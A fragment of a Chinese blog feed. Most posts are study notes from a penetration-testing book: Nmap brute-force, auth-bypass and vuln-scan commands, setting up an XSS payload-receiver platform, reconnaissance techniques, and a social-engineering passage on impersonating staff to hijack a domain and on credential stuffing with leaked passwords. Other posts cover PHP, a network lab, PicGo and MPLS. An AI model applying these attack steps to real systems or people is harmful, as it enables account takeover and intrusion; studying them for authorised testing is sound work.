id="2-1-3-1-Nmap的脚本分为以下几类"><a href="#2-1-3-1-Nmap的脚本分为以下几类" class="headerlink" title="2.1.3.1 Nmap的脚本分为以下几类"></a>2.1.3.1 Nmap的脚本分为以下几类</h4><ul><li>Auth：负责处理鉴权证书(绕过鉴权)的脚本</li><li>Broadcast：在局域网内探查更多服务的开启情况，如DHCP/DNS/SQLServer等</li><li>Brute：针对常见的应用提供暴力破解方式，如HTTP/SMTP等</li><li>Default：使用-sC或A选项扫描时默认的脚本，提供基本的脚本扫描能</li><li>Discovery： 对网络进行更多信息的搜集，如SMB枚举、SNMP查询等</li><li>Dos：用于进行拒绝服务攻击</li><li>Exploit： 利用已知的漏洞入侵系统</li><li>External： 利用第三方的数据库或资源。例如，进行Whois解析</li><li>Fuzzer： 模糊测试脚本，发送异常的包到目标机，探测出潜在漏洞</li><li>Intrusive： 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏<br>蔽</li><li>Malware：探测目标机是否感染了病毒、开启后门等信息</li><li>Safe：此类与Intrusive相反，属于安全性脚本</li><li>Version：负责增强服务与版本扫描功能的脚本</li><li>Vuln：负责检查目标机是否有常见漏洞，如MS08-067</li></ul><h4 id="2-1-3-2-常用脚本"><a href="#2-1-3-2-常用脚本" class="headerlink" title="2.1.3.2 常用脚本"></a>2.1.3.2 常用脚本</h4><p>用户可根据需要设置–script=类别进行扫描</p><p>常用参数</p><ul><li>-sC/–script=default：使用默认的脚本进行扫描</li><li>–script=&lt;Lua scripts&gt;：使用某个脚本进行扫描</li><li>–script-args=key1=value1, key2=value2……：该参数用于传递脚本里的参数，key1是参数名，该参数对应value1这个值。如有更多的参数，使用逗号连接</li><li>-script-args-file=filename：使用文件为脚本提供参数</li><li>–script-trace：如果设置该参数，则显示脚本执行过程中发送与接收的数据</li><li>–script-updatedb：在Nmap的scripts目录里有一个script.db文件，该文件保存了当前Nmap可用的脚本，类似于一个小型数据库，如果我们开启Nmap并调用了此参数，则Nmap会自行扫描scripts目录中的扩展脚本，进行数据库更新</li><li>–script-help：调用该参数后，Nmap会输出该脚本对应的脚本使用参数，以及详细的介绍信息</li></ul><h4 id="2-1-3-3-实例"><a href="#2-1-3-3-实例" class="headerlink" title="2.1.3.3 实例"></a>2.1.3.3 实例</h4><ol><li><p>鉴权扫描</p><p>使用–script=auth对目标主机进行应用弱口令检测</p><p><code>nmap --script=auth 192.168.0.105</code></p></li><li><p>暴力破解</p><p>对数据库、SMB、SNMP等进行简单的密码爆破</p><p><code>nmap --script=brute 192.168.0.105</code></p></li><li><p>扫描常见的漏洞</p><p><code>nmap --script=vuln 192.168.0.105</code></p></li><li><p>应用服务扫描</p><p>Nmap具备很多常见应用服务的扫描脚本，如：VNC服务，MySQL服务，Telnet服务，Rsync服务</p><p>VNC：<code>nmap --script=realvnc-auth-bypass 192.168.0.105</code></p></li><li><p>探测局域网内更多服务开启的情况</p><p><code>nmap -n -p 445 --sctipt=broadcast 192.168.0.105</code></p></li><li><p>Whois 解析</p><p><code>nmap -script external baidu.com</code></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>书籍 Web安全攻防-渗透测试实战指南</category>
      
    </categories>
    
    
    <tags>
      
      <tag>书籍</tag>
      
      <tag>渗透测试</tag>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS平台搭建</title>
    <link href="/2021/07/29/%E4%BF%A1%E5%AE%89/Tools/XSS%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/"/>
    <url>/2021/07/29/%E4%BF%A1%E5%AE%89/Tools/XSS%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="搭建XSS测试平台"><a href="#搭建XSS测试平台" class="headerlink" title="搭建XSS测试平台"></a>搭建XSS测试平台</h1><h1 id="下载平台资源"><a href="#下载平台资源" class="headerlink" title="下载平台资源"></a>下载平台资源</h1><p><a href="https://github.com/trysec/BlueLotus_XSSReceiver">地址</a></p><h1 id="具体安装"><a href="#具体安装" class="headerlink" title="具体安装"></a>具体安装</h1><ol><li><p>将下载的内容解压到网页下，并访问对应目录的admin.php界面进行设置</p></li><li><p>之后按照设置的内容在login.php登录，并修改公共模板的内容将网站地址设置为对应ip地址的index.php界面，最后在我的js中添加模板，生成payload即可</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>信安 Tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS平台</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试实战指南-信息收集</title>
    <link href="/2021/07/27/%E4%B9%A6%E7%B1%8D/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2021/07/27/%E4%B9%A6%E7%B1%8D/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h1 id="1-收集域名信息"><a href="#1-收集域名信息" class="headerlink" title="1. 收集域名信息"></a>1. 收集域名信息</h1><p>在信息收集中，最主要的就是收集服务器的配置信息和网站的敏感信息，其中包括域名及子域名信息、目标网站系统.CMS指纹、目标网站真实IP、开放的端口等。换句话说，只要是与目标网站相关的信息，我们都应该去尽量搜集</p><h2 id="1-1-收集域名信息"><a href="#1-1-收集域名信息" class="headerlink" title="1.1 收集域名信息"></a>1.1 收集域名信息</h2><p>获得目标的域名之后，我们要做的第一件事就是获取域名的注册信息，包括该域名的DNS服务器信息和注册人的联系信息等</p><p>常用方法有</p><h3 id="1-1-1-Whois-查询"><a href="#1-1-1-Whois-查询" class="headerlink" title="1.1.1 Whois 查询"></a>1.1.1 Whois 查询</h3><p>Whois是一个标准的互联网协议，可用于收集网络注册信息，注册的域名、IP地址等信息。Whois就是一个用于查询域名是否已被注册以及注册域名的详细信息的数据库（如域名所有人、域名注册商)</p><p>在kali中搜索即可获取</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">whois baidu.com<br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210727165047.png"></p><p>常用的查询网站</p><ul><li><a href="https://whois.aizhan.com/">爱站工具网</a></li><li><a href="http://whois.chinaz.com/">站长之家</a></li><li><a href="https://www.virustotal.com/">VirusTotal</a></li></ul><h3 id="1-1-2-备案信息查询"><a href="#1-1-2-备案信息查询" class="headerlink" title="1.1.2 备案信息查询"></a>1.1.2 备案信息查询</h3><p>常用查询网站</p><ul><li><a href="http://beianbeian.com/">ICP备案查询</a></li><li><a href="http://www.tianyancha.com/">天眼查</a></li></ul><h1 id="2-收集敏感信息"><a href="#2-收集敏感信息" class="headerlink" title="2. 收集敏感信息"></a>2. 收集敏感信息</h1><p>谷歌引擎搜索</p><p>对应语法</p><table><thead><tr><th>关键字</th><th>说明</th></tr></thead><tbody><tr><td>site</td><td>指定域名</td></tr><tr><td>inurl</td><td>URL中存在关键字的网页</td></tr><tr><td>intext</td><td>网页正文中的关键字</td></tr><tr><td>filetype</td><td>指定文件类型</td></tr><tr><td>intitle</td><td>网页标题中的关键字</td></tr><tr><td>link</td><td>link:baidu.com即表示返回所有和baidu.com做了链接的URL</td></tr><tr><td>info</td><td>查找指定站点的一些基本信息</td></tr><tr><td>cache</td><td>搜索Google你关于某些内容的缓存</td></tr></tbody></table><p>举例：<code>site:edu.cn intext:后台管理</code>含义是搜索网页正文还有“后台管理”并域名后缀是edu.cn的网站</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210727170124.png"></p><p>类似语句在百度和搜狗等搜索引擎上均可</p><p>此外通过网页返回的头部同样可以获取部分服务器方面的信息</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210727170511.png"></p><h1 id="3-收集子域名信息"><a href="#3-收集子域名信息" class="headerlink" title="3. 收集子域名信息"></a>3. 收集子域名信息</h1><p>子域名也就是二级域名。当对于主域无法入手时可以从子域名入手</p><h2 id="3-1-子域名检查工具"><a href="#3-1-子域名检查工具" class="headerlink" title="3.1 子域名检查工具"></a>3.1 子域名检查工具</h2><h3 id="3-1-1-子域名检测工具"><a href="#3-1-1-子域名检测工具" class="headerlink" title="3.1.1 子域名检测工具"></a>3.1.1 子域名检测工具</h3><ol><li>Layer子域名挖掘机</li><li>K8</li><li>wydomain</li><li>Sublist3r</li><li>dnsmaper</li><li>subDomainsBrute</li><li>Maltego CE</li></ol><h3 id="3-1-2-搜索引擎枚举"><a href="#3-1-2-搜索引擎枚举" class="headerlink" title="3.1.2 搜索引擎枚举"></a>3.1.2 搜索引擎枚举</h3><p>使用<code>site:baidu.com</code>的语法就能够获得百度的子域名</p><h3 id="3-1-3-第三方聚合应用枚举"><a href="#3-1-3-第三方聚合应用枚举" class="headerlink" title="3.1.3 第三方聚合应用枚举"></a>3.1.3 第三方聚合应用枚举</h3><p>利用网站</p><ol><li><a href="https://dnsdumpster.com/">DNSdumpster</a></li><li>在线DNS侦查和搜索的工具</li></ol><h3 id="3-1-4-证书透明度公开日志枚举"><a href="#3-1-4-证书透明度公开日志枚举" class="headerlink" title="3.1.4 证书透明度公开日志枚举"></a>3.1.4 证书透明度公开日志枚举</h3><p>证书透明度(Certificate Transparency，CT)是证书授权机构(CA)的一个项目，证书授权机构会将每个SSL/TLS证书发布到公共日志中。一个SSL/TLS证书通常包含域名、子域名和邮件地址</p><p>网站有</p><ul><li><a href="https://crt.sh/">https://crt.sh</a></li><li><a href="https://censys.io/">https://censys.io</a></li></ul><p>此外还有一些在线网站查询子域名如</p><p><a href="https://phpinfo.me/domain">子域名爆破网站</a></p><p><a href="http://dns.aizhan.com/">IP反查绑定域名网站</a></p><h1 id="4-收集常用端口信息"><a href="#4-收集常用端口信息" class="headerlink" title="4. 收集常用端口信息"></a>4. 收集常用端口信息</h1><p>常见的扫描工具</p><ol><li>Nmap</li><li>无状态端口扫描工具Masscan、ZMap</li><li>御剑高速TCP端口扫描工具</li></ol><p>扫描常见端口</p><h1 id="5-指纹识别"><a href="#5-指纹识别" class="headerlink" title="5. 指纹识别"></a>5. 指纹识别</h1><p>本节所讲的指纹是指网站CMS指纹识别、计算机操作系统及Web日期的指纹识别等</p><p>应用程序一般在html、js、css等文件中包含一些特征码</p><p>工具有：</p><ul><li>御剑Web指纹识别、</li><li>WhatWeb</li><li>WebRobo</li><li>椰树</li><li>轻量WEB指纹识别等</li></ul><p>在线网站有：</p><ul><li><a href="http://whatweb.bugscaner.com/look/">BugScaner</a></li><li><a href="http://www.yunsee.cn/finger.html">云悉指纹</a></li><li><a href="https://whatweb.net/">WhatWeb</a></li></ul><h1 id="6-查找真实IP"><a href="#6-查找真实IP" class="headerlink" title="6. 查找真实IP"></a>6. 查找真实IP</h1><p>如果目标服务器不存在CDN，可以直接通过<a href="http://www.ip138.com获取目标的一些ip及域名信息,这里主要讲解在以下这几种情况下,如何绕过cdn寻找目标服务器的真实ip/">www.ip138.com获取目标的一些IP及域名信息，这里主要讲解在以下这几种情况下，如何绕过CDN寻找目标服务器的真实IP</a></p><h2 id="6-1-目标服务器存在CDN"><a href="#6-1-目标服务器存在CDN" class="headerlink" title="6.1 目标服务器存在CDN"></a>6.1 目标服务器存在CDN</h2><p>直接ping目标的域名得到的是离我们最近的一台目标节点的CDN服务器，导致无法获得目标的真实IP</p><h2 id="6-2-判断目标是否使用了CDN"><a href="#6-2-判断目标是否使用了CDN" class="headerlink" title="6.2 判断目标是否使用了CDN"></a>6.2 判断目标是否使用了CDN</h2><p>通过多地ping对比获取的IP地址是否一致如果一致则大概率不存在CDN</p><p><a href="https://www.17ce.com/">多地ping</a></p><h2 id="6-3-绕过CDN寻找真实IP"><a href="#6-3-绕过CDN寻找真实IP" class="headerlink" title="6.3 绕过CDN寻找真实IP"></a>6.3 绕过CDN寻找真实IP</h2><p>一些常规的方法</p><ol><li><p>内部邮箱源</p><p>一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件、寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP</p></li><li><p>扫描网站测试文件</p><p>如phpinfo，test等等，从而找到真实IP</p></li><li><p>分站域名</p></li><li><p>国外访问</p></li><li><p>查询域名的解析记录</p><p>如果之前没有使用CDN可用通过<a href="https://www.netcraft.com/">NETCRAFT</a>来观察域名的IP你是记录</p></li><li><p>通过网站对应的APP，抓包APP的请求获取真实IP</p></li><li><p>绕过CloudFlare CDN查找真实IP</p><p>很多网站都是使用CloudFlare通过的CDN访问，可以尝试通过在线网站<a href="http://www.crimeflare.us/cfs.html">CloudFlareWatch</a>对CloudFlare客户网进行真实IP查询</p></li></ol><h2 id="6-4-验证获取的IP"><a href="#6-4-验证获取的IP" class="headerlink" title="6.4 验证获取的IP"></a>6.4 验证获取的IP</h2><p>如果是Web，最简单的验证方法是直接尝试用IP访问，看看响应的页面是不是和访问域名返回的一样;</p><p>或者在目标段比较大的情况下，借助类似Masscan的工具批扫描对应IP段中所有开了80、443、8080端口的IP，然后逐个尝试IP访问,观察响应结果是否为目标站点</p><h1 id="7-收集敏感目录文件"><a href="#7-收集敏感目录文件" class="headerlink" title="7. 收集敏感目录文件"></a>7. 收集敏感目录文件</h1><p>针对网站的目录扫描</p><p>工具：</p><ol><li>DirBuster</li><li>御剑后台扫描珍藏版</li><li>wwwscan</li><li>Spinder.py(轻量级快速单文件目录后台扫描)</li><li>Sensitivefilescan(轻量级快速单文件目录后台扫描)</li><li>Weakfilescan(轻量级快速单文件目录后台扫描)</li></ol><p>在线网站</p><p><a href="http://www.webscan.cc/">WebScan</a></p><h1 id="8-社会工程学"><a href="#8-社会工程学" class="headerlink" title="8. 社会工程学"></a>8. 社会工程学</h1><p>可以利用收集到的这家公司的某位销售人员的电子邮箱。首先，给这位销售人员发送邮件，假装对某个产品很感兴趣，显然销售人员会回复邮件。这样攻击者就可以通过分析邮件头来收集这家公司的真实IP地址及内部电子邮件服务器的相关信息</p><p>通过进一步地应用社会工程学，假设现在已经收集了目标人物的邮箱、QQ、电话号码、姓名，以及域名服务商，也通过爆破或者撞库的方法获取邮箱的密码，这时就可以冒充目标人物要求客服人员协助重置域管理密码，甚至技术人员会帮着重置密码，从而使攻击者拿下域管理控制台，然后做域劫持</p><p>除此以外，还可以利用“社工库”查询想要得到的信息，社工库是用社会工程学进行攻击时积索的各方数据的结构化数据库。这个数据库里有大量信息，甚至可以找到每个人的各种行为记录。利用收集到的邮箱，可以在社工库中找到已经泄露的密码，其实还可以通过搜索引擎搜索到社交账号等信息，然后通过利用社交和社会工程学得到的信息构造密码字典，对目标用户的邮箱和OA账号进行爆破或者撞库</p>]]></content>
    
    
    <categories>
      
      <category>书籍 Web安全攻防-渗透测试实战指南</category>
      
    </categories>
    
    
    <tags>
      
      <tag>书籍</tag>
      
      <tag>信息收集</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php常用</title>
    <link href="/2021/07/25/PHP/php%E5%B8%B8%E7%94%A8/"/>
    <url>/2021/07/25/PHP/php%E5%B8%B8%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="1-文件操作"><a href="#1-文件操作" class="headerlink" title="1.文件操作"></a>1.文件操作</h1><ol><li>scandir()遍历目录，有<code>.</code>,<code>..</code>内容</li><li>file_exists(path) 判断文件或目录是否存在</li><li>is_dir 目录是否存在</li></ol><h1 id="2-数组遍历"><a href="#2-数组遍历" class="headerlink" title="2. 数组遍历"></a>2. 数组遍历</h1><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment"># 第一个为原数组 </span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;count(<span class="hljs-variable">$arr</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>];<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试总结</title>
    <link href="/2021/07/23/eNSP/%E6%B5%8B%E8%AF%95%E6%80%BB%E7%BB%93/"/>
    <url>/2021/07/23/eNSP/%E6%B5%8B%E8%AF%95%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="考核总结"><a href="#考核总结" class="headerlink" title="考核总结"></a>考核总结</h1><p>实验拓扑图：</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210723202121.png"></p><h2 id="1-对于拓扑图的理解"><a href="#1-对于拓扑图的理解" class="headerlink" title="1. 对于拓扑图的理解"></a>1. 对于拓扑图的理解</h2><p>首先看到拓扑图的时候的感受不深，只是认为简单的在财务部和技术部进行dhcp配置</p><p>在网关路由器进行nat转换</p><p>和在最后需要进行限制的地方进行acl过滤</p><h2 id="2-实验中的具体操作"><a href="#2-实验中的具体操作" class="headerlink" title="2. 实验中的具体操作"></a>2. 实验中的具体操作</h2><p>在一天的实验中</p><ol><li>首先在汇聚/接入交换机设置了接口的dhcp，并限制了最后的200到254的分配</li><li>在汇聚/接入交换机设置acl过滤，不允许两个部分互相通讯</li><li>设置两台交换机之间的双链路连接</li><li>由于设置的dhcp在下方的交换机，无法连接之上的交换机，所以只能在之上继续设置对应的vlan和vlanif地址</li><li>在业务区设置acl不允许任何ip的 icmp协议进入</li><li>又由于无法通过网关路由连接其他网段，在核心交换机设置了ospf进行连接</li><li>并在网关设置了acl只允许网段192.168.200.0/24的信息到网段2.2.2.2/30</li><li>在网关设置了nat转换并在核心交换机设置静态地址到网关</li><li>最后在分支子网路由设置了只允许172.16.100.0/24的ip访问172.16.100.254的acl</li></ol><h2 id="3-最后实验讲解的总结"><a href="#3-最后实验讲解的总结" class="headerlink" title="3. 最后实验讲解的总结"></a>3. 最后实验讲解的总结</h2><ol><li>首先是交换机的dhcp服务设置的位置不正确，并对于dhcp通过交换机设置不熟悉</li><li>端口映射只在理论上了解，在平时实验中没有了解，并在实验中完全没有操作</li><li>acl过滤应当尽量在内网的网关处设置</li><li>静态路由的设置只有最基础的全部ip信息处理，对于向外和向内抛的处理不了解</li></ol><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h2><ol><li>由于没有实际的设计经验，对于整个设计都有很多不合理的地方</li><li>在题目理解过程中没有正确的理解，并对于一些设备不熟悉和了解</li><li>对由于之前多是使用dhcp端口，对于整体的pool池设置不熟悉</li><li>整体来说还需要更多的实验去熟悉整体的配置。</li></ol>]]></content>
    
    
    <categories>
      
      <category>eNSP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eNSP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gitee建立图库</title>
    <link href="/2021/07/21/Git/Gitee%E5%BB%BA%E7%AB%8B%E5%9B%BE%E5%BA%93/"/>
    <url>/2021/07/21/Git/Gitee%E5%BB%BA%E7%AB%8B%E5%9B%BE%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h1 id="Gitee建立图库"><a href="#Gitee建立图库" class="headerlink" title="Gitee建立图库"></a>Gitee建立图库</h1><h1 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h1><ol><li>创建一个在gitee上的库并获取对应的Token</li><li>下载PicGo并安装 <a href="https://github.com/Molunerfinn/PicGo/releases">下载地址</a></li></ol><h1 id="2-PicGo"><a href="#2-PicGo" class="headerlink" title="2. PicGo"></a>2. PicGo</h1><p>在PicGo中下载gitee对应的插件，直接点击下载即可</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210721225529.png"></p><p>之后进入对应插件进行设置，按照下载的Gitee插件介绍进行设置</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210721225541.png"></p><p>最后按照PicGo进行相关设置进行个人的设置，比如将文件名重命名！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>创建库的时候需要建立对应的Readme，不然无法上传成功</li><li>这个图库上传后只有弹窗显示url地址，无法直接进行复制。暂时还不知道怎么解决</li></ol>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Gitee</tag>
      
      <tag>图库</tag>
      
      <tag>PicGo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MPLS,SR基本原理</title>
    <link href="/2021/07/21/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/MPLS,SR%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"/>
    <url>/2021/07/21/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/MPLS,SR%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="MPLS-SR基本原理"><a href="#MPLS-SR基本原理" class="headerlink" title="MPLS/SR基本原理"></a>MPLS/SR基本原理</h1><h2 id="1-MPLS基本原理"><a href="#1-MPLS基本原理" class="headerlink" title="1.MPLS基本原理"></a>1.MPLS基本原理</h2><h3 id="1-1-MPLS-概述"><a href="#1-1-MPLS-概述" class="headerlink" title="1.1 MPLS 概述"></a>1.1 MPLS 概述</h3><h4 id="1-1-1-转发模式"><a href="#1-1-1-转发模式" class="headerlink" title="1.1.1 转发模式"></a>1.1.1 转发模式</h4><ol><li><p>传统IP转发</p><p><img src="https://pic.imgdb.cn/item/60f78cd45132923bf88580f1.png"></p></li><li><p>ATM信元转发</p><p><img src="https://pic.imgdb.cn/item/60f78cfb5132923bf88610f8.png"></p></li><li><p>MPLS标签转发</p><p><img src="https://pic.imgdb.cn/item/60f78f7a5132923bf88e8201.png"></p><p>传统的IP技术简单，且部署成本低，但由于硬件技术存在限制，基于最长匹配算法的IP技术必须使用软件查找路由，转发性能低下。为了适应网络的发展，ATM(AsynchronousTransfer Mode）技术应运而生。ATM采用定长标签(即信元)，并且只需要维护比路由表规模小得多的标签表，能够提供比IP路由方式高得多的转发性能。如何结合IP与ATM的优点成为当时热门话题。多协议标签交换技术MPLS(Multiprotocol Label Switching)就是在这种背景下产生的。</p></li></ol><h4 id="1-1-2-MPLS-结合其他技术应用"><a href="#1-1-2-MPLS-结合其他技术应用" class="headerlink" title="1.1.2 MPLS 结合其他技术应用"></a>1.1.2 MPLS 结合其他技术应用</h4><p>随着ASIC(Application Specific Integrated Circuit)技术的发展，路由查找速度已经不是阻碍网络发展的瓶颈。这使得MPLS在提高转发速度方面不再具备明显的优势。但另一方面结合其它技术的应用上MPLS成为了一大亮点</p><ol><li><p>MPLS VPN应用</p><p><img src="https://pic.imgdb.cn/item/60f790105132923bf8906295.png"></p></li><li><p>MPLS TE应用</p><p><img src="https://pic.imgdb.cn/item/60f7902f5132923bf890c454.png"></p></li></ol><h3 id="1-2-MPLS基本原理"><a href="#1-2-MPLS基本原理" class="headerlink" title="1.2 MPLS基本原理"></a>1.2 MPLS基本原理</h3><p>MPLS网络模型</p><p><img src="https://pic.imgdb.cn/item/60f790905132923bf891f9e6.png"></p><h4 id="1-2-1-MPLS-控制平面和转发平面"><a href="#1-2-1-MPLS-控制平面和转发平面" class="headerlink" title="1.2.1 MPLS 控制平面和转发平面"></a>1.2.1 MPLS 控制平面和转发平面</h4><p><img src="https://pic.imgdb.cn/item/60f790a65132923bf892413d.png"></p><p>为了更好的理解MPLS技术必须要了解它的体系结构，MPLS的体系结构由控制平面(Control Plane)和转发平面(Forwarding Plane)组成。</p><h4 id="1-2-2-MPLS-标签格式"><a href="#1-2-2-MPLS-标签格式" class="headerlink" title="1.2.2 MPLS 标签格式"></a>1.2.2 MPLS 标签格式</h4><h5 id="1-2-2-1-帧模式MPLS"><a href="#1-2-2-1-帧模式MPLS" class="headerlink" title="1.2.2.1 帧模式MPLS"></a>1.2.2.1 帧模式MPLS</h5><p>MPLS有两种封装模式︰帧模式和信元模式(ATM采用MPLS信元模式封装，本课不涉及)</p><p>帧模式封装是直接在报文的二层头部和三层头部之间增加一个MPLS标签头。以太网、PPP采用这种封装模式</p><p><img src="https://pic.imgdb.cn/item/60f7910f5132923bf893b717.png"></p><p>MPLS标签是MPLS信息传递的载体，路由器之间通过标签的交互，完成在建立的标签转发路径上传送数据</p><h5 id="1-2-2-2-MPLS报文头部"><a href="#1-2-2-2-MPLS报文头部" class="headerlink" title="1.2.2.2 MPLS报文头部"></a>1.2.2.2 MPLS报文头部</h5><p><img src="https://pic.imgdb.cn/item/60f7913e5132923bf8944e80.png"></p><ol><li>MPLS头部长度为32bits</li><li>LABEL∶该标签用于报文转发，长度为20bits </li><li>EXP∶通常用来承载IP报文中的优先级，长度为3bits </li><li>S∶标识栈底用来表明是否是最后一个标签( MPLS标签可以多层嵌套），长度为1bit </li><li>TTL∶类似IP头部的TTL，用来防止报文环路等，长度为8bits</li></ol><h5 id="1-2-2-3-MPLS标签嵌套"><a href="#1-2-2-3-MPLS标签嵌套" class="headerlink" title="1.2.2.3 MPLS标签嵌套"></a>1.2.2.3 MPLS标签嵌套</h5><p><img src="https://pic.imgdb.cn/item/60f7918e5132923bf89552eb.png"></p><ul><li><p>PID标识二层头部后面的报文类型</p><ol><li><p>Ethernet 0x0800 IPv4 0x8847 MPLS单播报文0x8848 MPLS多播报文</p></li><li><p>PPP 0x8021 IPv4 0x8281 MPLS单播报文0x8283 MPLS多播报文</p></li></ol></li><li><p>S标识是否是栈底标签</p></li><li><p>标签嵌套应用</p><ul><li>MPLS VPN</li><li>MPLS TE</li></ul></li><li><p>这里的Label1，Label2，Label3都指的是前一个胶片中的4个Bytes的MPLS头部，其中包含有20bits的标签信息</p></li></ul><h4 id="1-2-3-MPLS-转发流程"><a href="#1-2-3-MPLS-转发流程" class="headerlink" title="1.2.3 MPLS 转发流程"></a>1.2.3 MPLS 转发流程</h4><h5 id="1-2-3-1-FEC与NHLFE"><a href="#1-2-3-1-FEC与NHLFE" class="headerlink" title="1.2.3.1 FEC与NHLFE"></a>1.2.3.1 FEC与NHLFE</h5><ul><li>FEC ( Forwarding Equivalence Class )转发等价类，是一组具有某些共性的数据流的集合。这些数据流在转发过程中被LSR以相同方式处理</li><li>FEC可以根据地址、业务类型、QoS等要素进行划分。例如，在传统的采用最长匹配算法的IP转发中，到同一条路由的所有报文就是一个转发等价类</li><li>NHLFE ( Next Hop Label Forwarding Entry ) :进行标签转发时用到，NHLFE包含这样一些基本信息∶<ul><li>报文的下一跳</li><li>如何进行标签操作（包括压入新的标签，弹出标签，用新的标签替换原有的标签等操作)</li><li>NHLFE还可能包含—些其他信息，如发送报文使用的链路层封装等</li></ul></li></ul><p><img src="https://pic.imgdb.cn/item/60f792555132923bf897d4f4.png"></p><h5 id="1-2-3-2-MPLS转发过程"><a href="#1-2-3-2-MPLS转发过程" class="headerlink" title="1.2.3.2 MPLS转发过程"></a>1.2.3.2 MPLS转发过程</h5><ul><li><p>Ingress-LER(RTA):</p><p>在Ingress，通过查询FIB表和NHLFE表指导报文的转发</p><p><img src="https://pic.imgdb.cn/item/60f792a35132923bf898cf9b.png"></p></li><li><p>LSR(RTB):</p><p>  在Transit，通过查询ILM(Incoming Label Map)表和NHLFE 表指导MPLS报文的转发</p><p>  <img src="https://pic.imgdb.cn/item/60f792f55132923bf899d955.png"></p><p>  入标签到一组下一跳标签转发表项的映射称为入标签映射ILM(Incoming Label Map)。ILM在Transit节点的作用是将标签和NHLFE绑定。通过标签索引ILM表，就相当于使用目的IP地址查询FIB，能够得到所有的标签转发信息</p></li><li><p>LSR(RTC):</p><p>  <img src="https://pic.imgdb.cn/item/60f7932c5132923bf89a7fb8.png"></p></li><li><p>Egress LER(RTD)</p><p>  在Egress，通过查询ILM表指导MPLS报文的转发</p><p>  <img src="https://pic.imgdb.cn/item/60f793ab5132923bf89c3413.png"></p></li></ul><h2 id="2-SR基本原理"><a href="#2-SR基本原理" class="headerlink" title="2. SR基本原理"></a>2. SR基本原理</h2><h3 id="2-1-SR技术背景"><a href="#2-1-SR技术背景" class="headerlink" title="2.1 SR技术背景"></a>2.1 SR技术背景</h3><h4 id="2-1-1-SR产生背景"><a href="#2-1-1-SR产生背景" class="headerlink" 